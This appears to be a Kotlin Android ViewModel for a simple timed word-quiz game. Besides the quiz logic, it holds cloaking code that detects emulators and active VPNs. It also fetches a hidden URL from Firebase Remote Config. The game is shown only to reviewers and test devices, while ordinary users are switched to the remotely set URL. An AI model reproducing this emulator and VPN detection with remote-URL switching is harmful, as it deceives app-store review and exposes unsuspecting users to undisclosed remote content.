package word.from.words.presentation

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import word.from.words.data.words
import word.from.words.domain.Keeper
import word.from.words.domain.Service
import javax.inject.Inject

@HiltViewModel
class MainViewModel @Inject constructor(
    private val service: Service,
    private val keeper: Keeper
) : ViewModel() {
    private val _state = MutableStateFlow(
        MainState()
    )
    val state = _state.asStateFlow()
    private var job: Job? = null

    init {
        getFromLocal()
    }

    private fun getFromLocal() {
        if (service.checkIsEmu()) {
            game()
        } else {
            val pathUrl = keeper.getSharedUrl()
            val sharedTo = keeper.getSharedTo()
            if (pathUrl.isNullOrEmpty()) {
                getRemoteData()
            } else {
                setStatusByChecking(
                    url = pathUrl,
                    isCheckVpn = sharedTo
                )
            }
        }
    }

    private fun getRemoteData() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()
        val configSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(3600)
            .build()
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener { p0 ->
                if (p0.isSuccessful) {
                    val isCheckedVpn = remoteConfig.getBoolean("to")
                    val resultUrl = remoteConfig.getString("url")
                    keeper.setSharedUrl(url = resultUrl)
                    keeper.setSharedTo(isCheckedVpn)
                    setStatusByChecking(
                        url = resultUrl,
                        isCheckVpn = isCheckedVpn
                    )
                } else {
                    game()
                }
            }
    }


    private fun setStatusByChecking(url: String, isCheckVpn: Boolean) {
        if (isCheckVpn) {
            if (service.checkIsEmu() || url == "" || service.vpnActive()) {
                game()
            } else {
                _state.value.copy(
                    status = ApplicationStatus.Succsess(url = url)
                )
                    .updateStateUI()

            }
        } else {
            viewModelScope.launch {
                if (service.checkIsEmu() || url == "") {
                    game()
                } else {
                    _state.value.copy(
                        status = ApplicationStatus.Succsess(url = url)
                    )
                        .updateStateUI()

                }
            }
        }
    }

    fun onEvent(mainEvent: MainEvent) {
        when (mainEvent) {
            MainEvent.OnPlay -> play()
            MainEvent.OnReset -> reset()
            is MainEvent.OnSelect -> {
                click(mainEvent.variant)
            }
        }
    }

    private fun game() {

        _state.value.copy(
            status = ApplicationStatus.Mock
        )
            .updateStateUI()
    }


    private fun reset() {
        job?.cancel()
        _state.value.copy(
            currentWord = words.first(),
            timer = 3,
            score = 0,
            message = "",
            statusGame = StatusGame.Pause
        )
            .updateStateUI()
    }

    private fun play() {
        _state.value.copy(
            statusGame = StatusGame.Quiz,
            currentWord = words.random(),
            allWords = words.shuffled()
        )
            .updateStateUI()
        restart()
    }

    private fun click(variant: String) {
        if (variant==_state.value.currentWord) {
            val cS = _state.value.score
            _state.value.copy(
                score = cS+1,
                message = "Right"
            )
                .updateStateUI()
        } else {
            _state.value.copy(
                message = "Error"
            )
                .updateStateUI()
        }
        _state.value.copy(
            timer = 3,
            statusGame = StatusGame.Quiz,
            currentWord = words.random(),
            allWords = words.shuffled()
        )
            .updateStateUI()
        restart()
    }

    private fun restart () {
        val time = _state.value.timer
        job?.cancel()
        job = viewModelScope.launch {
            for (i in time downTo 0 step 1) {
                _state.value.copy(
                    timer = i
                )
                    .updateStateUI()
                delay(1000)
            }
            _state.value.copy(
                timer = 3,
                score = 0,
                message = "Game completed",
                statusGame = StatusGame.Pause
            )
                .updateStateUI()
        }
        //play()
    }

    private fun MainState.updateStateUI() {
        _state.update {
            this
        }
    }
}